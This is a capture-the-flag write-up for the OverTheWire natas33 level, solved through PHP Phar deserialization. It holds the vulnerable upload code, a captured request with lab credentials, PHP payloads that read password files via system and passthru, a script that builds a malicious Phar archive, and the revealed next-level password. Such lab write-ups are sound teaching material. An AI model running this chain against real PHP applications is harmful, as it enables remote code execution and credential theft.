# Overview
We have the source code for this challenge:
```
        <?php
            // graz XeR, the first to solve it! thanks for the feedback!
            // ~morla
            class Executor{
                private $filename=""; 
                private $signature='adeafbadbabec0dedabada55ba55d00d';
                private $init=False;

                function __construct(){
                    $this->filename=$_POST["filename"];
                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
                        echo "File is too big<br>";
                    }
                    else {
                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
                        else{
                            echo "There was an error uploading the file, please try again!<br>";
                        }
                    }
                }

                function __destruct(){
                    // upgrade firmware at the end of this script

                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
                }
            }
        ?>
```

The webpage has a file browser box and a upload button. When uploading a file the following request is sent:
```
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
Content-Length: 476
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Upgrade-Insecure-Requests: 1
Origin: http://natas33.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryw1ROyWmCDOgSqG2e
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas33.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.1.851326341.1718765417; _ga_RD0K2239G0=GS1.1.1718765416.1.1.1718765646.0.0.0; PHPSESSID=ojnt9e0d381u2hjqm5gg422gu5
Connection: close

------WebKitFormBoundaryw1ROyWmCDOgSqG2e
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
------WebKitFormBoundaryw1ROyWmCDOgSqG2e
Content-Disposition: form-data; name="filename"

ojnt9e0d381u2hjqm5gg422gu5
------WebKitFormBoundaryw1ROyWmCDOgSqG2e
Content-Disposition: form-data; name="uploadedfile"; filename="hack.php"
Content-Type: application/x-php

ÿØÿ<?php system("cat /etc/natas_webpass/natas14"); ?>

------WebKitFormBoundaryw1ROyWmCDOgSqG2e--
```

Here the idea is to leverage a PHP Phar deserialization vulnerability. PHP comes with [built-in wrappers](https://www.php.net/manual/en/wrappers.php) for filesystem operations such as:
- file:// (this is the default wrapper)
- http://
- phar://
- ...

This means that you can get the PHP interpreter to download a file, extract an archive, stream data, ... when calling a filesystem operation such as `file_exists()`. And notably we can get PHP to process a Phar archive. 

I am not 100% clear about phar archives, that webpage has a good summary: https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability. We want to leverage the fact that the PHP interpreter will deserialize the manifest metadata when the phar:// wrapper is used in a file operation. In the code above you can target:
```
md5_file($this->filename)
```

If `$this->filename` is a phar stream where the manifest metadata contains a serialized `Executor` object, then the function `__destruct()` is called when that object is destructed. But as we can control the object attributes, we can pass an arbitrary signature and then reach the `passthru()` function call to execute arbitrary PHP code. However we need to go through a few steps first.

# Step1
Create and upload a PHP file that will be executed later:
```
<?php echo passthru('cat /etc/natas_webpass/natas34'); ?>
```

MD5 hash for that file (including trailing `\n`) is bfee28e45dbae1099099831877db4213.

Upload the PHP file via the webpage, however intercept the request and append `.php` to the `filename` parameter:
```
------WebKitFormBoundarymoX9c2CXQ6g6EwsS
Content-Disposition: form-data; name="filename"

ojnt9e0d381u2hjqm5gg422gu5.php
```

Our PHP file should be written to the server at the path `/natas33/upload/ojnt9e0d381u2hjqm5gg422gu5.php`.

# Step2
Generate and upload a Phar file with a serialized `Executor` object. To create the Phar file you can use a PHP script:
```
<?php
class Executor {}

$phar = new Phar('pwn.phar');

$executor = new Executor();
$executor->filename = 'ojnt9e0d381u2hjqm5gg422gu5.php';
$executor->signature = 'bfee28e45dbae1099099831877db4213';
$executor->init = false;

$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($executor);
$phar->addFromString('_', '_');
```

Note that the `Executor` object attributes match the PHP file above.

Upload the PHP file via the webpage, however intercept the request and append `.phar` to the `filename` parameter.

# Step3
Upload a dummy file (it can anything really), however make sure to update the `filename` parameter to:
```
phar://ojnt9e0d381u2hjqm5gg422gu5.phar
```

When the server receives the request the PHP interpreter will deserialize the Phar manifest metadata and instantiate an `Executor` object where we control attributes. When the object is later destroyed, function `__destruct()` is called, we reach the `passthru()` function call and we get the PHP upload above to be executed.

# Profit
Password for the next level is `j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY`.
